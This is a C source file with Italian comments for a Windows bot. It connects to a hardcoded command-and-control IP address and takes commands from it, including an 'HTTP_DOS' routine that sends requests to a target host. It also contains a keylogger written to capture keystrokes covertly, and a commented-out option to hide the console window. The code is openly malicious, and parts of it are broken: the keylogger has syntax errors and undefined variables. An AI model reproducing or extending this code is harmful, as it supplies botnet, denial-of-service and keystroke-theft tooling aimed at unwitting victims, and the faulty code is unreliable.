/*
	Create a TCP socket
	libws2_32.a

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <windows.h>
#include <winsock2.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library

//Prototipi delle funzioni
void create_conn(int sock, char *server_ip, int server_port);
void expression_handler(char *command);
void hdos_exe(char *address);
void hostname_to_ip(char *address, char *ip);
void keylogger();
int main()
{
    /*PEr nascondere la console rimuovere i commenti
    WINAPI GetConsoleWindow();

    ShowWindow(GetConsoleWindow(), SW_HIDE);*/

	//Dichiarazione delle variabili
	WSADATA wsa;
	SOCKET s;
	char server_ip[15]="167.99.96.19";
	char server_reply[256];
	int recv_size;

	//Inizializzazione Winsock
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}
	//Creazione del socket
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
	}

	create_conn(s,server_ip, 34567);

	//Ricevo il comando da svolgere
	if((recv_size=recv(s , server_reply , 100 , 0))<0){
		printf ("recv failed");
	}

	server_reply[recv_size]='\0';

	expression_handler(server_reply);
	return 0;
}

//Sviluppo funzioni
//Funzione per effettuare una connessione

void create_conn(int sock, char *server_ip, int server_port){

	struct sockaddr_in server;
	server.sin_addr.s_addr = inet_addr(server_ip);
	server.sin_family = AF_INET;
	server.sin_port = htons( server_port );
	int ris;
	do{
		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
	}while(ris<0);


 }
//Funzione per gestire la stringa ricevuta
void expression_handler(char *command){
	char delim[2]=":";
	char *token;
	int ris;
	//Divido il comando ricevuto
	token = strtok(command, delim);

	if(strcmp("HTTP_DOS",token)==0){
		token = strtok(NULL,delim);

		hdos_exe(token);
	}
}
//Funzione per effettuare l' HTTPDOS
void hdos_exe(char *address){

	SOCKET sock_dos;
	char ip[15];
	char server_ris[512];
	char server_reply[256];
	//Creazione socket
	if((sock_dos = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
	}
	//Nel caso in cui sia un indirizzo di tipo:"www.abc.com"
	if(isalpha(address[0])){
		hostname_to_ip(address,ip);
	}

	create_conn(sock_dos, ip, 80);
	//Gestione tempo
	//HTTP REQUEST
	send(sock_dos, "GET /\r\n", strlen("GET /\r\n"),0);
	//Risposta
	//recv(sock_dos,server_ris,512,0);

}
//Funzione che converte un url in ip
void hostname_to_ip(char *address, char *ip){
	int i;
	struct hostent * he;
	struct in_addr **addr_list;
	he = gethostbyname(address);
	if (he==NULL){
	   //Gethostbynae failed
		printf("\n Get host failed");
	}
	 addr_list = (struct in_addr **) he -> h_addr_list;
	 for(i=0; addr_list[i]!=NULL; i++){
		strcpy(ip, inet_ntoa(*addr_list[i]));
	 }
	}

//keylogger
void keylogger():
    char path[100]="";
    char capture;
    FILE *file;

    time_t t = time(NULL);
    struct tm *tp = localtime(&t);

    file=fopen(path,"a+");
    strftime(s,100, " %H:%M del %d %B %Y",tp );
    fprintf(file, s);
    while (1)
    {
        Sleep(30); //Per non far insospettire nessuno
        if (kbhid())
        {
            capture = getch();
            switch((int)capture){
                case ' ': //Spazio
                    fprintf(file,' ');
                    break;
                case 0x09: //Tab
                    fprintf(file, '[TAB]');
                    break;
                case 0x0D: //Enter
                    fprintf(file,'[ENTER]');
                    break;
                case 0x1B: //Esc
                    fprintf(file, '[ESC]');
                    break;
                case 0x08: //Backspace
                    fprintf(file, '[BACKSPACE]');
                    break;
                default: //Qualsiasi alto carattere
                    fputc(capture,file)
            }

        }
    }






